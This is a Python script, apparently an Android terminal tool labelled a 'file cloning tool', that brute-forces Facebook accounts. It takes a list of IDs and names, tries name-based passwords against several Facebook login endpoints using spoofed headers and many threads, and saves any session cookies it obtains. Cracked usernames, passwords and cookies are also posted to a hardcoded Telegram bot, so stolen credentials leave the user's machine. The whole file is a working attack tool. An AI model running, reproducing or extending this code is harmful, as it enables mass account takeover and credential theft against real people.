import os
import sys
import time
import random
import uuid
import base64
import string
from os import system
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import requests

# --------------------- COLORS --------------------- #
G = "\033[1;32m"
R = "\033[1;31m"
W = "\x1b[38;5;15m"
Y = "\x1b[38;5;226m"
B = "\033[1;34m"

xp = f"{R}<[{W}●{R}]>{W}"
xp1 = f"{R}<[{W}1{R}]>{W}"
xp2 = f"{R}<[{W}2{R}]>{W}"
xp3 = f"{R}<[{W}3{R}]>{W}"
xp4 = f"{R}<[{W}4{R}]>{W}"
xp5 = f"{R}<[{W}5{R}]>{W}"
xp0 = f"{R}<[{W}0{R}]>{W}"
xpx = f"{R}<[{W}?{R}]>{W}"
xpxx = f"{R}>{W}>{R}>{W}"
xlinex = f"{R}━"*56

# --------------------- LOGO --------------------- #
logo = f"""
{xlinex}
{W}  DEVELOPER {xpxx} PS{G}-{W}
{W}  VERSION   {xpxx} V{G}2.1 (Updated){W}
{xlinex}
{xp} FILE CLONING TOOL - MODIFIED
{xlinex}"""

TELEGRAM_BOT_TOKEN = "8561477642:AAGjA6kFHXsnSWAlAqu6FWgl33ZjJg36DJA"
TELEGRAM_CHAT_ID = "7730742253"

def send_telegram_message(bot_token, chat_id, message):
    if not bot_token or not chat_id: return
    try:
        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", 
                     json={"chat_id": chat_id, "text": message, "parse_mode": "HTML"}, timeout=5)
    except: pass

def __CLEAR__():
    system("clear" if os.name == "posix" else "cls")
    print(logo)

def __LINE__():
    print(xlinex)

def UA():
    fbav3 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
    fbbv3 = str(random.randint(111111111, 999999999))
    density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
    width3 = random.choice(['720', '1080'])
    height3 = random.choice(['2400', '2340', '2560'])
    fblc3 = random.choice(["en_US","ar_AR","fr_FR","es_ES","pt_BR"])
    fbmf3 = 'samsung'
    fbdv3 = random.choice(['SM-A307G', 'SM-A515F', 'SM-A125F'])
    fbsv3 = f'{random.randint(10,14)}.{random.randint(0,5)}.{random.randint(1,5)}'
    ___Noor_on_Fire___ = f'[FBAN/FB4A;FBAV/{fbav3};FBBV/{fbbv3};FBDM/{{density={density3},width={width3},height={height3}}};FBLC/{fblc3};FBMF/{fbmf3};FBDV/{fbdv3};FBSV/{fbsv3};]'
    return ___Noor_on_Fire___

class __PSJO__:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.twf = []
        self.successful_attempts = 0
        self.__COOKIE__ = []
        self.__CP__ = []
        self.plist = []

    # ... (تابع باقي الكود في الجزء التالي)
    def __M1X__(self, ids, names, passlist):
        try:
            color = random.choice(["\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m", "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m", "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"])
            sys.stdout.write(f'\r{xp}{W}-{R}<[{W}PS{R}-{W}{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M1{R}]>{W}-{R}<[{G}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}{R}]>{W}-{R}<[{G}{self.successful_attempts}{R}/{W}ATT{R}]> ')
            sys.stdout.flush()

            fn = names.split(' ')[0]
            try: ln = names.split(' ')[1]
            except: ln = fn

            for pw in passlist:
                pas = pw.replace('first', fn.lower()).replace('First', fn).replace('FIRST', fn.upper()) \
       .replace('last', ln.lower()).replace('Last', ln).replace('LAST', ln.upper())
                ua = UA()
                accessToken = random.choice(['350685531728|62f8ce9f74b12f84c123cc23437a4a32', '256002347743983|374e60f8b9bb6b8cbb30f78030438895'])
                random_seed = random.Random()
                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                adid = ''.join(random_seed.choices(string.hexdigits, k=16))
                device_id = str(uuid.uuid4())
                __locale__ = {"en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR", "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE", "pt_BR": "BR"}
                country_locale = random.choice(list(__locale__.keys()))
                country_code = __locale__[country_locale]
                data = {
                    "adid": adid, "format": "json", "device_id": device_id, "cpl": "true", "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password", "error_detail_type": "button_with_disabled", "source": "device_based_login",
                    "email": ids, "password": f"#{pax}:0:{int(time.time())}:{pas}", "access_token": accessToken, "generate_session_cookies": "1",
                    "advertiser_id": str(uuid.uuid4()), "currently_logged_in_userid": "0", "locale": country_locale, "client_country_code": country_code,
                    "method": "auth.login", "fb_api_req_friendly_name": "authenticate", "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler", "api_key": "882a8490361da98702bf97a021ddc14d"
                }
                headers = {
                    "User-Agent": ua, "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "keep-alive", "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "graph.facebook.com", "X-FB-Net-HNI": str(random.randint(11111, 99999)), "X-FB-SIM-HNI": str(random.randint(11111, 99999)),
                    "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]), "X-Tigon-Is-Retry": "False",
                    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62", "x-fb-device-group": "5120",
                    "X-FB-Friendly-Name": "ViewerReactionsMutation", "X-FB-Request-Analytics-Tags": "graphservice", "X-FB-HTTP-Engine": "Liger", "X-FB-Client-IP": "True", "X-FB-Server-Cluster": "True", "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
                }
                url = "https://graph.facebook.com/auth/login"
                twf = "Login approval's are on"

                try:
                    po = requests.post(url, data=data, headers=headers, timeout=15).json()
                    self.successful_attempts += 1
                    if 'session_key' in po:
                        ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                        cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                        ok_message = f"OK\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}\n\n❖ - COOKIES : {cookie}"
                        print(f'\r{xp}{W}-{R}<{W}[{G}PS-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')
                        send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ok_message)
                        if 'y' in self.__COOKIE__:
                            print(f'\r{xp}{W}-{R}<{W}[{R}COOKIE{W}]{R}> {cookie}')
                        open('/sdcard/PS-/FILE/𝗙𝗔𝐈𝐑𝐎𝐒-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                        self.oks.append(ids)
                        break
                    elif twf in str(po):
                        if 'y' in self.__CP__:
                            print(f'\r{xp}{W}-{R}<{W}[{R}PS-2F{W}]{R}> {R}' + ids + f'/' + pas + '\033[1;97m')
                        open('/sdcard/PS-/FILE/𝗙𝗔𝐈𝐑𝐎𝐒-2F.txt', 'a').write(ids + '/' + pas + '\n')
                        self.twf.append(ids)
                        break
                    elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                        if 'y' in self.__CP__:
                            cp_message = f"CP\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}"
                            print(f'\r{xp}{W}-{R}<[{W}PS-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
                            send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, cp_message)
                        open('/sdcard/PS-/FILE/𝗙𝗔𝐈𝐑𝐎𝐒-CP.txt', 'a').write(ids + '/' + pas + '\n')
                        self.cps.append(ids)
                        break
                except:
                    continue
            self.loop += 1
        except:
            pass
    
    
    def __M2X__(self, ids, names, passlist):
        try:
            color = random.choice(["\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m", "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m", "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"])
            sys.stdout.write(f'\r{xp}{W}-{R}<[{W}PS{R}-{W}{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M2{R}]>{W}-{R}<[{G}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}{R}]>{W}-{R}<[{G}{self.successful_attempts}{R}/{W}ATT{R}]> ')
            sys.stdout.flush()

            fn = names.split(' ')[0]
            try: ln = names.split(' ')[1]
            except: ln = fn

            for pw in passlist:
                pas = pw.replace('first', fn.lower()).replace('First', fn).replace('FIRST', fn.upper()) \
       .replace('last', ln.lower()).replace('Last', ln).replace('LAST', ln.upper())
                ua = UA()
                accessToken = random.choice(['350685531728|62f8ce9f74b12f84c123cc23437a4a32', '256002347743983|374e60f8b9bb6b8cbb30f78030438895'])
                random_seed = random.Random()
                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                adid = ''.join(random_seed.choices(string.hexdigits, k=16))
                device_id = str(uuid.uuid4())
                __locale__ = {"en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR", "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE", "pt_BR": "BR"}
                country_locale = random.choice(list(__locale__.keys()))
                country_code = __locale__[country_locale]
                data = {
                    "adid": adid, "format": "json", "device_id": device_id, "cpl": "true", "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password", "error_detail_type": "button_with_disabled", "source": "device_based_login",
                    "email": ids, "password": f"#{pax}:0:{int(time.time())}:{pas}", "access_token": accessToken, "generate_session_cookies": "1",
                    "advertiser_id": str(uuid.uuid4()), "currently_logged_in_userid": "0", "locale": country_locale, "client_country_code": country_code,
                    "method": "auth.login", "fb_api_req_friendly_name": "authenticate", "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler", "api_key": "882a8490361da98702bf97a021ddc14d"
                }
                headers = {
                    "User-Agent": ua, "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "keep-alive", "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "b-graph.facebook.com", "X-FB-Net-HNI": str(random.randint(11111, 99999)), "X-FB-SIM-HNI": str(random.randint(11111, 99999)),
                    "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]), "X-Tigon-Is-Retry": "False",
                    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62", "x-fb-device-group": "5120",
                    "X-FB-Friendly-Name": "ViewerReactionsMutation", "X-FB-Request-Analytics-Tags": "graphservice", "X-FB-HTTP-Engine": "Liger", "X-FB-Client-IP": "True", "X-FB-Server-Cluster": "True", "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
                }
                url = "https://b-graph.facebook.com/auth/login"
                twf = "Login approval's are on"

                try:
                    po = requests.post(url, data=data, headers=headers, timeout=15).json()
                    self.successful_attempts += 1
                    if 'session_key' in po:
                        ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                        cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                        ok_message = f"OK\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}\n\n❖ - COOKIES : {cookie}"
                        print(f'\r{xp}{W}-{R}<{W}[{G}PS-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')
                        send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ok_message)
                        if 'y' in self.__COOKIE__:
                            print(f'\r{xp}{W}-{R}<{W}[{R}COOKIE{W}]{R}> {cookie}')
                        open('/sdcard/PS-/FILE/PS-M2-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                        self.oks.append(ids)
                        break
                    elif twf in str(po):
                        if 'y' in self.__CP__:
                            print(f'\r{xp}{W}-{R}<{W}[{R}PS-2F{W}]{R}> {R}' + ids + f'/' + pas + '\033[1;97m')
                        open('/sdcard/PS-/FILE/PS-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
                        self.twf.append(ids)
                        break
                    elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                        if 'y' in self.__CP__:
                            cp_message = f"CP\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}"
                            print(f'\r{xp}{W}-{R}<[{W}PS-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
                            send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, cp_message)
                        open('/sdcard/PS-/FILE/PS-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
                        self.cps.append(ids)
                        break
                except:
                    continue
            self.loop += 1
        except:
            pass
            
    def __M3X__(self, ids, names, passlist):
        try:
            color = random.choice(["\x1b[38;5;46m", "\x1b[38;5;226m", "\033[1;37m"])
            fn = names.split(' ')[0]
            try: ln = names.split(' ')[1]
            except: ln = fn

            for pw in passlist:
                pas = pw.replace('first', fn.lower()).replace('First', fn).replace('FIRST', fn.upper()) \
       .replace('last', ln.lower()).replace('Last', ln).replace('LAST', ln.upper())
                ua = UA()
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                adid = ''.join(random_seed.choices(string.hexdigits, k=16))
                device_id = str(uuid.uuid4())
                __locale__ = {"en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR", "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE", "pt_BR": "BR"}
                country_locale = random.choice(list(__locale__.keys()))
                country_code = __locale__[country_locale]

                data = {
                    "adid": adid, "format": "json", "device_id": device_id, "cpl": "true", "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password", "error_detail_type": "button_with_disabled", "source": "device_based_login",
                    "email": ids, "password": f"#{pax}:0:{int(time.time())}:{pas}", "access_token": accessToken, "generate_session_cookies": "1",
                    "advertiser_id": str(uuid.uuid4()), "currently_logged_in_userid": "0", "locale": country_locale, "client_country_code": country_code,
                    "method": "auth.login", "fb_api_req_friendly_name": "authenticate", "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler", "api_key": "882a8490361da98702bf97a021ddc14d"
                }
                headers = {
                    "User-Agent": ua, "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "keep-alive", "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "api.facebook.com", "X-FB-Net-HNI": str(random.randint(11111, 99999)), "X-FB-SIM-HNI": str(random.randint(11111, 99999)),
                    "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]), "X-Tigon-Is-Retry": "False",
                    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62", "x-fb-device-group": "5120",
                    "X-FB-Friendly-Name": "ViewerReactionsMutation", "X-FB-Request-Analytics-Tags": "graphservice", "X-FB-HTTP-Engine": "Liger", "X-FB-Client-IP": "True", "X-FB-Server-Cluster": "True", "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
                }
                url = "https://api.facebook.com/auth/login"
                twf = "Login approval's are on"

                # عرض الباسورد الجاري + Progress
                sys.stdout.write(f'\r{xp}{W} M3-{self.loop} | OK:{G}{len(self.oks)}{W} | Trying: {Y}{pas[:28]:<28}{W}')
                sys.stdout.flush()

                try:
                    po = requests.post(url, data=data, headers=headers, timeout=10).json()
                    self.successful_attempts += 1

                    if 'session_key' in po:
                        ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                        cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                        ok_message = f"OK\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}\n\n❖ - COOKIES : {cookie}"
                        print(f'\r{xp}{G} [OK] {ids} | {pas} {W}')
                        send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ok_message)
                        if 'y' in self.__COOKIE__:
                            print(f'\r{xp}{W} COOKIE: {cookie}')
                        open('/sdcard/PS-/FILE/PS-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                        self.oks.append(ids)
                        break
                    elif twf in str(po):
                        if 'y' in self.__CP__:
                            print(f'\r{xp}{R} [2F] {ids} | {pas} {W}')
                        open('/sdcard/PS-/FILE/PS-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
                        self.twf.append(ids)
                        break
                    elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                        if 'y' in self.__CP__:
                            cp_message = f"CP\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}"
                            print(f'\r{xp}{R} [CP] {ids} | {pas} {W}')
                            send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, cp_message)
                        open('/sdcard/PS-/FILE/PS-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
                        self.cps.append(ids)
                        break
                except requests.exceptions.RequestException as e:
                    print(f'\r{R}❌ Connection Error [M3]: {str(e)[:50]} - Retrying...{W}')
                    continue
                except:
                    continue
            self.loop += 1
        except:
            pass


    def __M4X__(self, ids, names, passlist):
        try:
            color = random.choice(["\x1b[38;5;46m", "\x1b[38;5;226m", "\033[1;37m"])
            fn = names.split(' ')[0]
            try: ln = names.split(' ')[1]
            except: ln = fn

            for pw in passlist:
                pas = pw.replace('first', fn.lower()).replace('First', fn).replace('FIRST', fn.upper()) \
       .replace('last', ln.lower()).replace('Last', ln).replace('LAST', ln.upper())
                ua = UA()
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                adid = ''.join(random_seed.choices(string.hexdigits, k=16))
                device_id = str(uuid.uuid4())
                __locale__ = {"en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR", "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE", "pt_BR": "BR"}
                country_locale = random.choice(list(__locale__.keys()))
                country_code = __locale__[country_locale]

                data = {
                    "adid": adid, "format": "json", "device_id": device_id, "cpl": "true", "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password", "error_detail_type": "button_with_disabled", "source": "device_based_login",
                    "email": ids, "password": f"#{pax}:0:{int(time.time())}:{pas}", "access_token": accessToken, "generate_session_cookies": "1",
                    "advertiser_id": str(uuid.uuid4()), "currently_logged_in_userid": "0", "locale": country_locale, "client_country_code": country_code,
                    "method": "auth.login", "fb_api_req_friendly_name": "authenticate", "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler", "api_key": "882a8490361da98702bf97a021ddc14d"
                }
                headers = {
                    "User-Agent": ua, "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "keep-alive", "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "b-api.facebook.com", "X-FB-Net-HNI": str(random.randint(11111, 99999)), "X-FB-SIM-HNI": str(random.randint(11111, 99999)),
                    "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]), "X-Tigon-Is-Retry": "False",
                    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62", "x-fb-device-group": "5120",
                    "X-FB-Friendly-Name": "ViewerReactionsMutation", "X-FB-Request-Analytics-Tags": "graphservice", "X-FB-HTTP-Engine": "Liger", "X-FB-Client-IP": "True", "X-FB-Server-Cluster": "True", "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
                }
                url = "https://b-api.facebook.com/auth/login"
                twf = "Login approval's are on"

                # عرض الباسورد الجاري + Progress
                sys.stdout.write(f'\r{xp}{W} M4-{self.loop} | OK:{G}{len(self.oks)}{W} | Trying: {Y}{pas[:28]:<28}{W}')
                sys.stdout.flush()

                try:
                    po = requests.post(url, data=data, headers=headers, timeout=10).json()
                    self.successful_attempts += 1

                    if 'session_key' in po:
                        ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                        cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                        ok_message = f"OK\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}\n\n❖ - COOKIES : {cookie}"
                        print(f'\r{xp}{G} [OK] {ids} | {pas} {W}')
                        send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ok_message)
                        if 'y' in self.__COOKIE__:
                            print(f'\r{xp}{W} COOKIE: {cookie}')
                        open('/sdcard/PS-/FILE/PS-M4-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                        self.oks.append(ids)
                        break
                    elif twf in str(po):
                        if 'y' in self.__CP__:
                            print(f'\r{xp}{R} [2F] {ids} | {pas} {W}')
                        open('/sdcard/PS-/FILE/PS-M4-2F.txt', 'a').write(ids + '/' + pas + '\n')
                        self.twf.append(ids)
                        break
                    elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                        if 'y' in self.__CP__:
                            cp_message = f"CP\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}"
                            print(f'\r{xp}{R} [CP] {ids} | {pas} {W}')
                            send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, cp_message)
                        open('/sdcard/PS-/FILE/PS-M4-CP.txt', 'a').write(ids + '/' + pas + '\n')
                        self.cps.append(ids)
                        break
                except requests.exceptions.RequestException as e:
                    print(f'\r{R}❌ Connection Error [M4]: {str(e)[:50]} - Retrying...{W}')
                    continue
                except:
                    continue
            self.loop += 1
        except:
            pass
    def __MENU__(self) -> None:
        if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
            self.get_telegram_credentials()
        __CLEAR__()
        print(f"{xp1} FILE CLONING ")
        print(f"{xp2} RANDOM CLONING{R} ({W}SOON{R}) ")
        print(f"{xp0} EXIT TOOLS ")
        __LINE__()
        __MENUC__ = input(f"{xpx} INPUT MENU {xpxx} ")
        if __MENUC__ == "1":
            self.__FILEX__()
        elif __MENUC__ == "2":
            __LINE__()
            print(f"{xp} RANDOM CLONE COMING SOON...! ")
            time.sleep(1.1)
            self.__MENU__()
        elif __MENUC__ == "0":
            __LINE__()
            print(f"{xp} EXIT SUCCESSFULLY ")
            time.sleep(1.1)
            sys.exit()
        else:
            __LINE__()
            print(f"{xp} INVALID OPTION TRY AGAIN ")
            time.sleep(1)
            self.__MENU__()

    def get_telegram_credentials(self):
        global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
        __CLEAR__()
        print(f"{xp} PLEASE ENTER YOUR TELEGRAM BOT TOKEN")
        __LINE__()
        token = input(f"{xpx} INPUT TOKEN {xpxx} ")
        if token:
            TELEGRAM_BOT_TOKEN = token
        __CLEAR__()
        print(f"{xp} PLEASE ENTER YOUR TELEGRAM CHAT ID")
        __LINE__()
        chat_id = input(f"{xpx} INPUT CHAT ID {xpxx} ")
        if chat_id:
            TELEGRAM_CHAT_ID = chat_id

    def __FILEX__(self) -> None:
        __CLEAR__()
        print(f"{xp} EXAMPLE  {xpxx} /sdcard/ids.txt ")
        __LINE__()
        __fileloX__ = input(f"{xpx} INPUT FILE PATH {xpxx} ")
        try:
            if not __fileloX__.startswith("/") and not __fileloX__.startswith("./"):
                __fileXX__ = f"/sdcard/{__fileloX__}"
            else:
                __fileXX__ = __fileloX__
            __fileckX__ = open(__fileXX__, 'r').read().splitlines()
        except FileNotFoundError:
            __LINE__()
            print(f"{xp} FILE NOT FOUND TRY AGAIN ")
            time.sleep(1.2)
            self.__FILEX__()
            return
        except:
            __LINE__()
            print(f"{xp} ERROR READING FILE ")
            time.sleep(1.2)
            self.__FILEX__()
            return

        __CLEAR__()
        print(f"{xp1} METHOD {R}<[{W}GRAPH{R}]>{W}")
        print(f"{xp2} METHOD {R}<[{W}B-GRAPH{R}]>{W}")
        print(f"{xp3} METHOD {R}<[{W}API{R}]>{W}")
        print(f"{xp4} METHOD {R}<[{W}B-API{R}]>{W}")
        __LINE__()
        __METHODF__ = input(f"{xpx} INPUT METHOD {xpxx} ") or "1"

        __CLEAR__()
        print(f"{xp1} AUTO PASSLIST ")
        print(f"{xp2} CUSTOM PASSLIST ")
        __LINE__()
        __PASLISTF__ = input(f"{xpx} INPUT PASSLIST {xpxx} ") or "1"

        self.plist = []
        if __PASLISTF__ == "1":
            self.plist = ["first12345", "first123456", "firstlast", "first@123", "first786", "first112233"]
        else:
            try:
                __PASSFM__ = int(input(f"{xp} PASSLIST LIMIT (5-12) {xpxx} ") or 8)
            except:
                __PASSFM__ = 8
            __CLEAR__()
            for i in range(__PASSFM__):
                self.plist.append(input(f"{xp} ENTER PASS {i+1} {xpxx} "))

        __CLEAR__()
        print(f"{xp1} AUTO SPEED (45) ")
        print(f"{xp2} CUSTOM SPEED ")
        __LINE__()
        __SPEED__ = input(f"{xpx} INPUT SPEED {xpxx} ") or "1"
        __MAXX__ = 45 if __SPEED__ == "1" else int(input(f"{xp} ENTER SPEED (20-60) {xpxx} ") or 45)

        __CLEAR__()
        __co__ = input(f"{xp} SHOW COOKIE? (y/n) {xpxx} ").lower()
        __cps__ = input(f"{xp} SHOW CP/2F? (y/n) {xpxx} ").lower()
        self.__COOKIE__.append('y' if __co__ in ['y','yes','1'] else 'n')
        self.__CP__.append('y' if __cps__ in ['y','yes','1'] else 'n')
        
        with ThreadPool(max_workers=__MAXX__) as __PS__:
            __CLEAR__()
            total_ids = str(len(__fileckX__))
            print(f"{xp} TOTAL IDS {xpxx} {total_ids} ")
            print(f"{xp} SPEED {xpxx} {__MAXX__} THREADS")
            print(f"{xp} IF NO RESULT → USE AIRPLANE MODE")
            __LINE__()
            for user in __fileckX__:
                try:
                    if '|' in user:
                        ids, names = user.split('|', 1)
                    else:
                        continue
                except:
                    continue
                if __METHODF__ == "1":
                    __PS__.submit(self.__M1X__, ids.strip(), names.strip(), self.plist)
                elif __METHODF__ == "2":
                    __PS__.submit(self.__M2X__, ids.strip(), names.strip(), self.plist)
                elif __METHODF__ == "3":
                    __PS__.submit(self.__M3X__, ids.strip(), names.strip(), self.plist)
                elif __METHODF__ == "4":
                    __PS__.submit(self.__M4X__, ids.strip(), names.strip(), self.plist)
                else:
                    __PS__.submit(self.__M1X__, ids.strip(), names.strip(), self.plist)

        print("\n" + xlinex)
        print(f"{xp} THE PROCESS HAS COMPLETED...!")
        print(f"{xp} OK: {G}{len(self.oks)}{W} | 2F: {len(self.twf)} | CP: {len(self.cps)}")
        print(f"{xp} SUCCESSFUL ATTEMPTS: {G}{self.successful_attempts}{W}")
        __LINE__()
        print(f"{xp} THANKS FOR USING.....! ")
        input("Press Enter to Exit...")
        sys.exit()


# ==================== RUN ==================== #
if __name__ == "__main__":
    tool = __PSJO__()
    tool.__MENU__()
